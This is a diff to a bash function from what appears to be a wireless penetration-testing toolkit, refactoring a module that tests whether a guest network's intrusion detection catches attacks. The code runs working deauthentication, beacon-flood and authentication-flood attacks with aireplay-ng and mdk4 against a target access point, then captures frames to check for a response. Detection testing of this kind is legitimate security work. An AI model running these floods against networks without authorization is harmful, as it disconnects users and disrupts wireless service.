@@ -39,8 +39,27 @@
 
 run_h1() {
     set -uo pipefail
+
+    local mon_iface="${MONITOR_INTERFACE:-}"
+    local target_ssid="${GUEST_SSID:-}"
+    local target_bssid="${GUEST_BSSID:-}"
+    local target_channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --monitor-interface) mon_iface="$2"; shift 2 ;;
+            --target-ssid) target_ssid="$2"; shift 2 ;;
+            --target-bssid) target_bssid="$2"; shift 2 ;;
+            --target-channel) target_channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
     local total_steps=7
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/h1"
+    local evidence_prefix="${evidence_dir}/h1"
 
     #--- Step 1: Verify tools ---
     log_step 1 $total_steps "Verifying tools"
@@ -48,13 +67,12 @@ run_h1() {
 
     check_module_dependencies "H1" || return 1
 
-    
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$target_ssid" || -z "$target_bssid" ]]; then
         log_error "Target SSID/BSSID not set. Run A1 first."
         return 1
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID})"
+    log_success "Target: ${target_ssid} (${target_bssid})"
 
     #--- Warning banner ---
     echo ""
@@ -90,7 +108,7 @@ run_h1() {
         echo "============================================================"
         echo "  H1: WIDS/WIPS Detection Testing"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${target_ssid} (${target_bssid})"
         echo "============================================================"
         echo ""
     } > "$findings_file"
@@ -106,23 +124,24 @@ run_h1() {
     log_step 2 $total_steps "Enabling monitor mode"
     update_tc_progress 2 $total_steps "Monitor mode"
 
-    enable_monitor_mode || return 1
-    local mon_iface="${MONITOR_INTERFACE}"
+    if [[ -z "$mon_iface" ]]; then
+        enable_monitor_mode || return 1
+        mon_iface="${MONITOR_INTERFACE}"
+    fi
 
     # Set channel
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$target_channel" ]]; then
+        run_fg --quiet iw dev "$mon_iface" set channel "$target_channel" || true
     fi
 
     check_abort || return 1
 
     # Start response monitoring capture
     local response_pcap="${evidence_prefix}_response_capture.pcap"
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$response_pcap" \
-        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype action" \
-        &>/dev/null &
-    local mon_tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $mon_tcpdump_pid 2>/dev/null || true; wait $mon_tcpdump_pid 2>/dev/null || true"
+    spawn_bg "h1_capture" "tcpdump" \
+        -i "$mon_iface" \
+        -w "$response_pcap" \
+        "type mgt subtype deauth or type mgt subtype disassoc or type mgt subtype action"
 
     #--- Helper: Check for WIDS response ---
     _check_wids_response() {
@@ -133,8 +152,8 @@ run_h1() {
 
         # Capture specifically for the response period
         log_info "Monitoring for 15s for ${test_name} response..."
-        timeout "$duration" ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$tmp_pcap" \
-            "type mgt subtype deauth and wlan addr2 ${GUEST_BSSID}" &>/dev/null || true
+        timeout "$duration" run_fg --quiet tcpdump -i "$mon_iface" -w "$tmp_pcap" \
+            "type mgt subtype deauth and wlan addr2 ${target_bssid}" || true
 
         local new_deauths=0
         if command -v tshark &>/dev/null && [[ -f "$tmp_pcap" ]]; then
@@ -164,17 +183,21 @@ run_h1() {
 
     echo "[$(date '+%H:%M:%S')] TEST 1: Deauthentication Burst" >> "$test_log"
 
+    local has_aireplay="false"
+    local has_mdk4="false"
+    command -v aireplay-ng &>/dev/null && has_aireplay="true"
+    command -v mdk4 &>/dev/null && has_mdk4="true"
+
     if [[ "$has_aireplay" == "true" ]]; then
-        log_cmd "${TOOL_PATHS[aireplay-ng]} --deauth 10 -a ${GUEST_BSSID} ${mon_iface}"
-        ${TOOL_PATHS[aireplay-ng]} --deauth 10 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
-        echo "  Sent 10 deauth frames via ${TOOL_PATHS[aireplay-ng]}" >> "$test_log"
+        run_fg --quiet aireplay-ng --deauth 10 -a "$target_bssid" "$mon_iface" || true
+        echo "  Sent 10 deauth frames via aireplay-ng" >> "$test_log"
     elif [[ "$has_mdk4" == "true" ]]; then
-        timeout 5 ${TOOL_PATHS[mdk4]} "$mon_iface" d -B "$GUEST_BSSID" -c "${GUEST_CHANNEL:-0}" &>/dev/null || true
-        echo "  Sent deauth flood via ${TOOL_PATHS[mdk4]} (5s)" >> "$test_log"
+        timeout 5 run_fg --quiet mdk4 "$mon_iface" d -B "$target_bssid" -c "${target_channel:-0}" || true
+        echo "  Sent deauth flood via mdk4 (5s)" >> "$test_log"
     fi
 
     local deauth_response
-    local deauth_response=$(_check_wids_response "Deauth Detection")
+    deauth_response=$(_check_wids_response "Deauth Detection")
 
     if [[ "$deauth_response" == "true" ]]; then
         local deauth_detected="true"
@@ -198,21 +221,19 @@ run_h1() {
     echo "[$(date '+%H:%M:%S')] TEST 2: Fake AP Beacon Flood" >> "$test_log"
 
     if [[ "$has_mdk4" == "true" ]]; then
-        log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} b -c ${GUEST_CHANNEL:-1}"
-
         # Brief beacon flood (10 seconds of fake APs)
-        timeout 10 ${TOOL_PATHS[mdk4]} "$mon_iface" b \
-            -c "${GUEST_CHANNEL:-1}" \
-            -w nta &>/dev/null || true
+        timeout 10 run_fg --quiet mdk4 "$mon_iface" b \
+            -c "${target_channel:-1}" \
+            -w nta || true
 
-        echo "  Sent fake AP beacons via ${TOOL_PATHS[mdk4]} (10s)" >> "$test_log"
+        echo "  Sent fake AP beacons via mdk4 (10s)" >> "$test_log"
     else
-        log_info "${TOOL_PATHS[mdk4]} not available — skipping beacon flood test"
-        echo "  SKIPPED: ${TOOL_PATHS[mdk4]} not available" >> "$test_log"
+        log_info "mdk4 not available — skipping beacon flood test"
+        echo "  SKIPPED: mdk4 not available" >> "$test_log"
     fi
 
     local fake_ap_response
-    local fake_ap_response=$(_check_wids_response "Fake AP Detection")
+    fake_ap_response=$(_check_wids_response "Fake AP Detection")
 
     if [[ "$fake_ap_response" == "true" ]]; then
         local fake_ap_detected="true"
@@ -236,20 +257,18 @@ run_h1() {
     echo "[$(date '+%H:%M:%S')] TEST 3: Authentication Flood" >> "$test_log"
 
     if [[ "$has_mdk4" == "true" ]]; then
-        log_cmd "${TOOL_PATHS[mdk4]} ${mon_iface} a -a ${GUEST_BSSID}"
-
         # Brief auth flood (10 seconds)
-        timeout 10 ${TOOL_PATHS[mdk4]} "$mon_iface" a \
-            -a "$GUEST_BSSID" &>/dev/null || true
+        timeout 10 run_fg --quiet mdk4 "$mon_iface" a \
+            -a "$target_bssid" || true
 
-        echo "  Sent auth flood via ${TOOL_PATHS[mdk4]} (10s)" >> "$test_log"
+        echo "  Sent auth flood via mdk4 (10s)" >> "$test_log"
     else
-        log_info "${TOOL_PATHS[mdk4]} not available — skipping auth flood test"
-        echo "  SKIPPED: ${TOOL_PATHS[mdk4]} not available" >> "$test_log"
+        log_info "mdk4 not available — skipping auth flood test"
+        echo "  SKIPPED: mdk4 not available" >> "$test_log"
     fi
 
     local auth_response
-    local auth_response=$(_check_wids_response "Auth Flood Detection")
+    auth_response=$(_check_wids_response "Auth Flood Detection")
 
     if [[ "$auth_response" == "true" ]]; then
         local auth_flood_detected="true"
@@ -262,6 +281,7 @@ run_h1() {
     fi
 
     # Stop monitoring capture
+    stop_process "h1_capture"
     
     validate_pcap "$response_pcap" "WIDS response monitoring capture"
 
